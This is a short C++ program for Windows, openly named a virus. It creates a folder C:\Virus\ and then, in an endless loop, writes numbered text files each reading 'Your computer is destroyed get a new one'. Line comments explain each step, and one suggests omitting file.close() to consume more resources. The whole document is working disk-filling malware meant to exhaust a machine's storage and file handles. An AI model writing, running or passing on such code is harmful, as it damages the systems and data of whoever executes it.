#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>

int main()
{
    std::size_t i = 0;                                                            // starts a counting number this will help this program to create separate files
    const char *path = "C:\\Virus\\";                                                      // location in which all files are going to stored
    std::string content = "Your computer is destroyed get a new one. 0x0";                 // the content of our files
    _mkdir(path);                                                                          // creates a folder in c: drive in which files are going to written in and saved
    while (true)                                                                           // an infinite loop
    {
        i++;                                                                               // adds i to itself every time
        std::ofstream file;                                                                // creates a constructor this will save our file
        file.open(path + std::to_string(i) + ".txt", std::ios_base::out);                  // creates a file to a location
        file << content;                                                                   // writes the content in the file and then saves it
        file.close();                                                                      // closes the file // if you want to take more resources don't write this line
        std::cout << "File created: " + std::to_string(i) + "\r\n";                        // gives us an accurate number of files created inside a directory
    }
    return -1;
}
